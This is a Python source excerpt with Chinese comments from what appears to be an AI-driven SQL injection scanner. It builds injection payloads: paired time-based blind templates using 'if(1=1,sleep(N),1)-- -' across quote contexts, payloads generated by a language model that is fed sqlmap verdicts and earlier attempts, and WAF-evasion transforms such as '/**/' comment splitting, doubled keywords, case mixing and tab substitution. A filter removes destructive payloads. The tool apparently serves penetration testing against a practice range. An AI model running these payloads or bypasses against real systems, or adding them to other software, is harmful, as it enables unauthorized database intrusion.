# AI 只产出 boolean 向量的 payload → prober 只命中单一向量 → 按设计判 inconclusive，
# 整条漏检；而该靶的正确语境是**双引号闭合** + `if(cond,sleep(N),1)`。
# 因此时间向量必须由确定性模板兜底：真值分支受控休眠、假值分支立即返回，成对对照。
_TIME_PAIR_TEMPLATES = [
    ("{v}' and if(1=1,sleep({t}),1)-- -",
     "{v}' and if(1=2,sleep({t}),1)-- -"),
    ('{v}" and if(1=1,sleep({t}),1)-- -',
     '{v}" and if(1=2,sleep({t}),1)-- -'),
    ("{v} and if(1=1,sleep({t}),1)-- -",
     "{v} and if(1=2,sleep({t}),1)-- -"),
]


def _clip_verdict(text: str | None, limit: int = 1400) -> str | None:
    """截断 sqlmap 反馈。结构化摘要（关键行在前）保头；原始输出保尾。

    旧法一律 [-1200:]：结构化摘要的头部（DBMS/可用技法/列数）恰好被切掉，
    又回到"只喂噪音"的老问题。
    """
    verdict = (text or "").strip()
    if not verdict:
        return None
    if len(verdict) <= limit:
        return verdict
    if verdict.startswith("【SQLMap 结构化判定】"):
        return verdict[:limit]
    return verdict[-limit:]


def generate_payloads(db: Session, endpoint: Endpoint, waf_profile,
                      strategies: list[str] | None = None, base_value: str = "1",
                      probe_context: dict | None = None,
                      attempt_history: list | None = None,
                      sqlmap_output: str | None = None) -> list[dict]:
    """为接口生成探测 payload：模仿当前语境生成，而非死背模板。

    attempt_history / sqlmap_output 构成**反馈环**：上一轮实际发了什么、结果如何，
    以及 sqlmap 判了什么，都回喂给 AI，让它**依据真实反馈**改写语句（而不是重复同一形态）。
    """
    kb_samples = knowledge.find_payloads(
        db, waf_product=waf_profile.product if waf_profile and waf_profile.has_waf else None,
        limit=10)
    strategies = strategies or (waf_profile.bypass_suggestions if waf_profile else None) or []
    probes = (probe_context or {}).get("probes") or _collect_sqli_probes(endpoint)
    likely_dbms = (probe_context or {}).get("likely_dbms") or "unknown"
    if likely_dbms == "unknown":
        blob = " ".join((p.get("snippet") or "") for p in probes).lower()
        if "sqlite" in blob or "unrecognized token" in blob:
            likely_dbms = "sqlite"

    client = get_ai_client(db)
    payloads: list[dict] = []

    if client is not None:
        prompt = json.dumps({
            "target_param": {"method": endpoint.method, "path": endpoint.path,
                             "params": endpoint.params, "read_write": endpoint.read_write},
            "waf": ({"product": waf_profile.product,
                     "block_behavior": waf_profile.block_behavior} if waf_profile else None),
            "bypass_strategies": strategies,
            "probe_evidence": probes[:6],
            "likely_dbms": likely_dbms,
            "kb_success_samples": [{"payload": k.payload, "vector": k.vector,
                                    "tags": k.bypass_tags, "dbms": k.dbms} for k in kb_samples],
            # ---- 反馈环：上一轮实际发了什么、效果如何 ----
            "previous_attempts": (attempt_history or [])[:12],
            "sqlmap_verdict": _clip_verdict(sqlmap_output, 1400),
            "instruction": "基于 probe_evidence 的报错形态模仿生成，不要无依据乱造；"
                           "若 previous_attempts 显示某形态 payload『无变化/被过滤』，"
                           "**不要重复该形态**，改用等价变形重写；"
                           "sqlmap_verdict 是 sqlmap 的结构化判定（后端DBMS/可用技法/查询列数/"
                           "关键输出行）：可用技法与列数是硬结论，生成 UNION 时列数直接用它，"
                           "不要自己乱猜；若它说常规写法不可注入，说明写法被过滤/拦截，"
                           "改用空格替代与关键字双写重写再试",
        }, ensure_ascii=False)
        result = client.chat_json(_PAYLOAD_SYSTEM, prompt)
        if result and isinstance(result.get("payloads"), list):
            for p in result["payloads"][:5]:
                if isinstance(p, dict) and p.get("payload"):
                    item = {"payload": str(p["payload"]),
                            "vector": p.get("vector", "boolean"),
                            "false_variant": (str(p["false_variant"])
                                              if p.get("false_variant") else None),
                            "expected_criteria": p.get("expected_criteria", "")}
                    payloads.append(item)
                    # 对 AI 生成的 payload 也追加 `/**/` + 关键字双写变体：
                    # 禁空白 + 删关键字的 WAF（49920）AI 未必主动采用该形态。
                    if "space_comment" in (strategies or []):
                        payloads.append({
                            **item,
                            "payload": _apply_strategy(item["payload"], "space_comment"),
                            "false_variant": (_apply_strategy(item["false_variant"], "space_comment")
                                              if item["false_variant"] else None),
                            "expected_criteria": "space_comment 绕过（/**/ + 关键字双写）",
                        })

    if not payloads:                       # 降级：按 DBMS 选模板 + 知识库样本
        max_delay = config.DEFAULT_SCAN_CONFIG.get("time_based_max_delay_s", 5)
        templates = _BUILTIN_SQLITE if likely_dbms == "sqlite" else _BUILTIN_TEMPLATES
        for tpl, vector, criteria, false_tpl in templates:
            payload = tpl.format(v=base_value, t=min(5, max_delay))
            false_payload = (false_tpl.format(v=base_value, t=min(5, max_delay))
                             if false_tpl else None)
            for tag in strategies:         # 绕过变换对 true/false 同构应用，保证对照公平
                payload = _apply_strategy(payload, tag)
                if false_payload:
                    false_payload = _apply_strategy(false_payload, tag)
            payloads.append({"payload": payload, "vector": vector,
                             "false_variant": false_payload,
                             "expected_criteria": criteria.format(v=base_value, t=min(5, max_delay))})
        for k in kb_samples[:2]:
            payloads.append({"payload": k.payload, "vector": k.vector,
                             "expected_criteria": f"知识库回流样本（成功 {k.success_count} 次）"})

    # ---- 时间盲注确定性成对探针（永远追加，不依赖 AI/降级分支）----
    # 只追加一次；真值`sleep`、假值同型不休眠 → prober 可做受控对照（单向量即强证据）。
    max_delay = config.DEFAULT_SCAN_CONFIG.get("time_based_max_delay_s", 5)
    sleep_s = min(3, max_delay)
    seen = {p["payload"] for p in payloads}
    for true_tpl, false_tpl in _TIME_PAIR_TEMPLATES:
        tp = true_tpl.format(v=base_value, t=sleep_s)
        fp = false_tpl.format(v=base_value, t=sleep_s)
        if tp in seen:
            continue
        seen.add(tp)
        payloads.append({
            "payload": tp, "vector": "time", "false_variant": fp,
            "expected_criteria": (f"受控时间对：真值应 ≥{sleep_s}s、假值应≈基线"
                                  f"（差值 ≥{sleep_s * 0.8:.1f}s 才算命中）"),
        })

    # ---- 安全过滤器：破坏性语句直接剔除（写接口保护的一部分，全接口统一执行） ----
    safe = []
    for p in payloads:
        if is_destructive_payload(p["payload"]):
            bus.publish("ai", f"安全过滤器剔除破坏性 payload：{p['payload'][:50]}", level="warn")
            continue
        safe.append(p)
    return safe


def _apply_strategy(payload: str, tag: str) -> str:
    """绕过策略变换（对内置模板应用）。"""
    if tag == "case_mix":
        return _case_mix(payload)
    if tag == "comment_split":
        return re.sub(r"\b(and|or|union|select|sleep)\b",
                      lambda m: f"{m.group(1)[0]}/**/{m.group(1)[1:]}", payload, flags=re.I)
    if tag == "encoding":
        # 不做变换：本工具统一经 httpx params/data 发送，payload 里的 %XX 会被再编码一次，
        # 到服务端只剩字面量 "%27"，注入必然失效（曾整批废掉 payload）。
        # 真要测 URL 编码绕过，需要把 payload 拼进**原始 query 串**——暂不支持，见 prober._normalize_payload
        return payload
    if tag == "whitespace":
        return payload.replace(" ", "\t")
    if tag == "space_comment":
        # 禁空白 + 关键字删除一次型 WAF（49920 实测）：
        # 空格 → /**/，select/from/union/where 双写（剥一次仍还原）。
        # ⚠️ 只双写**首次出现**：靶场只删第一次出现的该关键字，
        # 第二次出现若也双写会残留下 `SELSELECTECT` 字面量（实测 syntax error）。
        out = payload.replace(" ", "/**/")
        for kw in ("select", "from", "union", "where"):
            out = re.sub(rf"\b{kw}\b",
                         lambda m: m.group(0)[:1] + m.group(0) + m.group(0)[1:],
                         out, count=1, flags=re.I)
        return out
    return payload


def _case_mix(s: str) -> str:
    out, i = [], 0
    for ch in s:
        if ch.isalpha():
            out.append(ch.upper() if i % 2 else ch.lower())
            i += 1
        else:
            out.append(ch)
    return "".join(out)
